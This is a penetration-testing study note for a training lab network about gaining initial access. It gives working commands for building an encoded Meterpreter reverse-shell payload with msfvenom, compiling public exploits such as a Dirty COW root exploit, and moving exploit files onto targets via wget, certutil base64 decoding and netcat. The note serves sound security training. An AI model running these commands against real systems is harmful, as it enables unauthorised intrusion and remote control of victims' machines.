====== 0x3 Gain Foothold ======

===== (Gain initial access: develop exploit,  transfer exploit, and execute) =====
Created Saturday 19 December 2020

#Focus on using scripts in different languages, compiled exploits, Metasploit, password cracking tools and, where applicable, we will also exploit vulnerabilities manually. The ultimate objective in the exploitation phase is to get a root/system/administrator shell on the various hosts in the VHL lab network.

==== Pre-written Exploits ====
1. Download the exploit
	a. Exploit-db
	b. using searchsploit cp method from last section
2. Inspect the code to verify it isn't doing anything malicious.
3. Modify the code based on intel collected and intent of the code.
	a. You may need to build a payload, lookup how to use msfvenom, here's an example:
		msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=[IP attackbox] LPORT=4444 -e x86/shikata_ga_nai -f exe -o exploit.exe
	b. https://www.offensive-security.com/metasploit-unleashed/msfvenom/
4. Run the code, or if it needs to be compiled on linux skip to 5 or windows skip to 6.
5. Linux Compilation:
	a. Follow compile instructions, if possible do so on the target machine since it may need the dependecies. Otherwise compile locally and transfer.
	b. Without instruction use the correct compiler for the language
		gcc cowroot.c -o cowroot
	c. Ensure file is executable
		chmod 775 [filename]
6. Windows Compilation:
	a. Follow compile instructions, if possible do so on the target machine since it may need the dependecies. Otherwise compile locally and transfer.
	b. Without instruction use the correct compiler for the language
		i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
7. Transfer Exploits
	a. Python
		1. To transfer exploits. On the attack machine run the following in the folder that has the exploit:
			python -m SimpleHTTPServer
			-or-
			python3 -m http.server 8081 ([Optional: port])
		2. On the target machine I pull the file with:
			wget [attack box ip] :8000/[filename]
	b. Linux -> Windows (Base 64)
		1. base64 [file] | xclip -selection -clipboard
		2. On Windows: open notepad, paste and save as txt on desktop
		3. On Windows terminal, cd to desktop run:
			certutil -decode [file].txt [file].exe
	c. Netcat: assume we already have command execution on a target host.
		1. On target host: nc -lvp 8080 > /root/Desktop/transfer.txt
		2. On attack box: nc [target ip] 8080 < /root/Desktop/transfer.txt
8. Run
